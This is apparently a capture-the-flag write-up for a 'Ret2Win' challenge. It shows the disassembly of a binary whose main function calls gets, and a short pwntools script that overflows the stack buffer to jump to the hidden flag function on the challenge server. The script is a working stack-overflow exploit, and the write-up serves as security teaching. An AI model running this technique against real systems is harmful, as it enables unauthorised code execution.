# Ret2Win
When running `objdump` on the given binary we will notice two things. That the main function calls `gets` and that
the `call_me_to_get_the_flag` function never gets called.

```bash
objdump -d chal

[...]
080491d6 <call_me_to_get_the_flag>: <-- Address of call_me_to_get_the_flag
 80491d6:	55                   	push   ebp
 80491d7:	89 e5                	mov    ebp,esp
 80491d9:	53                   	push   ebx
 80491da:	81 ec 04 01 00 00    	sub    esp,0x104
 80491e0:	e8 2b ff ff ff       	call   8049110 <__x86.get_pc_thunk.bx>
 80491e5:	81 c3 0f 2e 00 00    	add    ebx,0x2e0f
 80491eb:	6a 00                	push   0x0
 80491ed:	8d 83 14 e0 ff ff    	lea    eax,[ebx-0x1fec]
 80491f3:	50                   	push   eax
 80491f4:	e8 a7 fe ff ff       	call   80490a0 <open@plt>
 80491f9:	83 c4 08             	add    esp,0x8
 80491fc:	89 45 f8             	mov    DWORD PTR [ebp-0x8],eax
 80491ff:	83 7d f8 ff          	cmp    DWORD PTR [ebp-0x8],0xffffffff
 8049203:	75 16                	jne    804921b <call_me_to_get_the_flag+0x45>
 8049205:	8d 83 1c e0 ff ff    	lea    eax,[ebx-0x1fe4]
 804920b:	50                   	push   eax
 804920c:	e8 6f fe ff ff       	call   8049080 <puts@plt>
 8049211:	83 c4 04             	add    esp,0x4
 8049214:	6a 01                	push   0x1
 8049216:	e8 75 fe ff ff       	call   8049090 <exit@plt>
 804921b:	68 00 01 00 00       	push   0x100
 8049220:	8d 85 f8 fe ff ff    	lea    eax,[ebp-0x108]
 8049226:	50                   	push   eax
 8049227:	ff 75 f8             	push   DWORD PTR [ebp-0x8]
 804922a:	e8 21 fe ff ff       	call   8049050 <read@plt>
 804922f:	83 c4 0c             	add    esp,0xc
 8049232:	85 c0                	test   eax,eax
 8049234:	79 16                	jns    804924c <call_me_to_get_the_flag+0x76>
 8049236:	8d 83 60 e0 ff ff    	lea    eax,[ebx-0x1fa0]
 804923c:	50                   	push   eax
 804923d:	e8 3e fe ff ff       	call   8049080 <puts@plt>
 8049242:	83 c4 04             	add    esp,0x4
 8049245:	6a 01                	push   0x1
 8049247:	e8 44 fe ff ff       	call   8049090 <exit@plt>
 804924c:	8d 85 f8 fe ff ff    	lea    eax,[ebp-0x108]
 8049252:	50                   	push   eax
 8049253:	8d 83 a3 e0 ff ff    	lea    eax,[ebx-0x1f5d]
 8049259:	50                   	push   eax
 804925a:	e8 01 fe ff ff       	call   8049060 <printf@plt>
 804925f:	83 c4 08             	add    esp,0x8
 8049262:	90                   	nop
 8049263:	8b 5d fc             	mov    ebx,DWORD PTR [ebp-0x4]
 8049266:	c9                   	leave
 8049267:	c3                   	ret

08049268 <main>:
 8049268:	55                   	push   ebp
 8049269:	89 e5                	mov    ebp,esp
 804926b:	53                   	push   ebx
 804926c:	83 ec 0c             	sub    esp,0xc
 804926f:	e8 9c fe ff ff       	call   8049110 <__x86.get_pc_thunk.bx>
 8049274:	81 c3 80 2d 00 00    	add    ebx,0x2d80
 804927a:	8b 83 f8 ff ff ff    	mov    eax,DWORD PTR [ebx-0x8]
 8049280:	8b 00                	mov    eax,DWORD PTR [eax]
 8049282:	6a 00                	push   0x0
 8049284:	6a 02                	push   0x2
 8049286:	6a 00                	push   0x0
 8049288:	50                   	push   eax
 8049289:	e8 22 fe ff ff       	call   80490b0 <setvbuf@plt>
 804928e:	83 c4 10             	add    esp,0x10
 8049291:	8b 83 fc ff ff ff    	mov    eax,DWORD PTR [ebx-0x4]
 8049297:	8b 00                	mov    eax,DWORD PTR [eax]
 8049299:	6a 00                	push   0x0
 804929b:	6a 02                	push   0x2
 804929d:	6a 00                	push   0x0
 804929f:	50                   	push   eax
 80492a0:	e8 0b fe ff ff       	call   80490b0 <setvbuf@plt>
 80492a5:	83 c4 10             	add    esp,0x10
 80492a8:	8b 83 f0 ff ff ff    	mov    eax,DWORD PTR [ebx-0x10]
 80492ae:	8b 00                	mov    eax,DWORD PTR [eax]
 80492b0:	6a 00                	push   0x0
 80492b2:	6a 02                	push   0x2
 80492b4:	6a 00                	push   0x0
 80492b6:	50                   	push   eax
 80492b7:	e8 f4 fd ff ff       	call   80490b0 <setvbuf@plt>
 80492bc:	83 c4 10             	add    esp,0x10
 80492bf:	8d 83 ba e0 ff ff    	lea    eax,[ebx-0x1f46]
 80492c5:	50                   	push   eax
 80492c6:	e8 b5 fd ff ff       	call   8049080 <puts@plt>
 80492cb:	83 c4 04             	add    esp,0x4
 80492ce:	8d 45 f2             	lea    eax,[ebp-0xe]
 80492d1:	50                   	push   eax
 80492d2:	e8 99 fd ff ff       	call   8049070 <gets@plt> <-- Call to gets
 80492d7:	83 c4 04             	add    esp,0x4
 80492da:	8d 45 f2             	lea    eax,[ebp-0xe]
 80492dd:	50                   	push   eax
 80492de:	8d 83 d4 e0 ff ff    	lea    eax,[ebx-0x1f2c]
 80492e4:	50                   	push   eax
 80492e5:	e8 76 fd ff ff       	call   8049060 <printf@plt>
 80492ea:	83 c4 08             	add    esp,0x8
 80492ed:	b8 00 00 00 00       	mov    eax,0x0
 80492f2:	8b 5d fc             	mov    ebx,DWORD PTR [ebp-0x4]
 80492f5:	c9                   	leave
 80492f6:	c3                   	ret
 [...]
```

It is well known that the `gets` function is dangerous and can lead to buffer overflow as the compiler will eagerly tell you.

This means we have a buffer overflow and need to overwrite the instruction pointer to point at the address of the `call_me_to_get_the_flag` function so we can get the flag.

We can use the `pwntools` library to help us exploit this:

```python
from pwn import *

r = remote("ggc.tf", 31337)
binary = ELF("./chal")
r.sendlineafter(b"Hello, what is your name?", b"a"*18+p32(binary.sym['call_me_to_get_the_flag']))
r.interactive()
```
